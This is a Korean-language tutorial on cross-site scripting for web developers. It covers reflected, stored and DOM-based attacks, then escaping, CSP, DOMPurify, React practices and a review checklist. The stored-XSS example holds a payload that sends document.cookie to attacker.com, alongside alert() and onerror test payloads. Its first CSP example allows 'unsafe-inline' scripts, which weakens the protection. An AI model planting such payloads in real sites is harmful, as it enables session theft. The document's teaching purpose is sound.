# XSS (Cross-Site Scripting)

## 개요

XSS는 웹 애플리케이션에서 가장 흔한 보안 취약점 중 하나입니다. 공격자가 악성 스크립트를 웹 페이지에 삽입하여 사용자의 브라우저에서 실행되게 하는 공격입니다.

## 왜 위험한가?

- **쿠키 탈취**: 세션 쿠키를 읽어 사용자 계정 탈취
- **개인정보 유출**: 페이지의 민감한 정보 접근
- **피싱**: 가짜 폼으로 사용자 정보 수집
- **키로거**: 사용자 입력 감시
- **리다이렉트**: 악성 사이트로 유도

---

## XSS 공격 유형

### 1. Reflected XSS (반사형)

URL 파라미터나 폼 입력값이 그대로 페이지에 출력될 때 발생

```html
<!-- 취약한 코드 -->
<div>검색어: <?php echo $_GET['q']; ?></div>

<!-- 공격 예시 -->
https://example.com/search?q=<script>alert('XSS')</script>
```

### 2. Stored XSS (저장형)

악성 스크립트가 데이터베이스에 저장되어 다른 사용자에게 표시될 때 발생

```html
<!-- 취약한 코드 -->
<div><?php echo $comment; ?></div>

<!-- 공격: 댓글로 악성 스크립트 입력 -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### 3. DOM-based XSS

클라이언트 측 JavaScript가 사용자 입력을 안전하지 않게 처리할 때 발생

```js
// 취약한 코드
const userInput = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = `Hello, ${userInput}!`;

// 공격 예시
// https://example.com?name=<img src=x onerror="alert('XSS')">
```

---

## 방어 방법

### 1. 출력 이스케이프 (Output Escaping)

#### HTML 이스케이프

```js
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;',
  };
  return text.replace(/[&<>"']/g, (m) => map[m]);
}

// 사용
const userInput = '<script>alert("XSS")</script>';
element.textContent = userInput; // 안전 (자동 이스케이프)
// 또는
element.innerHTML = escapeHtml(userInput); // 안전
```

#### React는 기본적으로 안전

```tsx
// ✅ 안전: React는 자동으로 이스케이프
const UserName = ({ name }) => {
  return <div>{name}</div>; // 자동 이스케이프
};

// ❌ 위험: dangerouslySetInnerHTML 사용 시
const UserName = ({ name }) => {
  return <div dangerouslySetInnerHTML={{ __html: name }} />;
};
```

### 2. Content Security Policy (CSP)

HTTP 헤더로 허용된 스크립트 소스만 실행되도록 제한

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```

```html
<!-- HTML meta 태그로도 설정 가능 -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self'"
/>
```

### 3. 입력 검증 (Input Validation)

```tsx
// ✅ 허용된 문자만 허용
function sanitizeInput(input: string): string {
  // 알파벳, 숫자, 공백만 허용
  return input.replace(/[^a-zA-Z0-9\s]/g, '');
}

// ✅ 길이 제한
function validateInput(input: string): boolean {
  return input.length > 0 && input.length <= 100;
}

// ✅ 정규식으로 패턴 검증
function validateEmail(email: string): boolean {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}
```

### 4. DOMPurify 사용

HTML을 안전하게 정화하는 라이브러리

```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

```tsx
import DOMPurify from 'dompurify';

// ✅ 안전한 HTML 삽입
const UserComment = ({ comment }) => {
  const cleanHtml = DOMPurify.sanitize(comment);
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
};
```

### 5. 안전한 DOM 조작

```js
// ❌ 위험: innerHTML 사용
element.innerHTML = userInput;

// ✅ 안전: textContent 사용
element.textContent = userInput;

// ✅ 안전: createElement 사용
const div = document.createElement('div');
div.textContent = userInput;
element.appendChild(div);
```

### 6. URL 검증

```tsx
// ❌ 위험: 사용자 입력을 그대로 URL로 사용
<a href={userInput}>링크</a>

// ✅ 안전: URL 검증
function isValidUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

// 사용
{isValidUrl(userInput) ? (
  <a href={userInput}>링크</a>
) : (
  <span>잘못된 URL</span>
)}
```

---

## React에서의 XSS 방어

### 1. 기본 동작 (자동 이스케이프)

```tsx
// ✅ 안전: React가 자동으로 이스케이프
const UserName = ({ name }) => {
  return <div>{name}</div>;
};

// 사용
<UserName name="<script>alert('XSS')</script>" />
// 출력: &lt;script&gt;alert('XSS')&lt;/script&gt;
```

### 2. dangerouslySetInnerHTML 주의

```tsx
// ⚠️ 위험: 신뢰할 수 있는 소스만 사용
const RichText = ({ html }) => {
  // DOMPurify로 정화 후 사용
  const cleanHtml = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
};
```

### 3. URL 속성 주의

```tsx
// ❌ 위험
<a href={userInput}>링크</a>

// ✅ 안전: URL 검증
const SafeLink = ({ url, children }) => {
  const isValid = isValidUrl(url);
  return isValid ? <a href={url}>{children}</a> : <span>{children}</span>;
};
```

---

## 실전 체크리스트

### 개발 시

- [ ] 사용자 입력을 `innerHTML`에 직접 넣지 않음
- [ ] React에서는 `dangerouslySetInnerHTML` 사용 시 DOMPurify 적용
- [ ] URL 파라미터를 그대로 출력하지 않음
- [ ] CSP 헤더 설정
- [ ] 입력 검증 및 이스케이프 적용

### 코드 리뷰 시

- [ ] 사용자 입력이 DOM에 직접 삽입되는지 확인
- [ ] `eval()`, `Function()`, `innerHTML` 사용 여부 확인
- [ ] 외부 URL을 그대로 사용하는지 확인
- [ ] CSP 정책이 적절한지 확인

---

## 참고 자료

- [OWASP - XSS](https://owasp.org/www-community/attacks/xss/)
- [MDN - Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [React Security Best Practices](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml)





